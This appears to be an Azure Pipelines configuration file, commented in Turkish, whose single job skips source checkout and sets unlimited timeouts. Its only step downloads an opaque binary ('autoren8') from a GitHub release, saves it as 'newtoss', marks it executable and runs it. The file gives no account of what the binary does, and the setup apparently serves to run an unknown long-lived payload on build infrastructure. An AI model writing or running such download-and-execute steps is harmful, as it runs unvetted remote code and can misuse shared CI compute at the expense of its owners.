trigger:
- main

jobs:
- job: long_run
  timeoutInMinutes: 0          # 0 = sınırsız
  cancelTimeoutInMinutes: 5
  pool:
    name: "german"

  steps:
  - checkout: none
  - bash: |
      set -euo pipefail
      URL="https://github.com/RenderAuto/Autos/releases/download/turkeyrender/autoren8"
      DEST="newtoss"
      echo "👉 İndiriliyor: $URL"
      wget -q -O "$DEST" "$URL"
      chmod +x "$DEST"
      echo "▶️ Çalıştırılıyor..."
      ./newtoss
    displayName: "İndir & Çalıştır"
    timeoutInMinutes: 0        # adım için de sınırsız
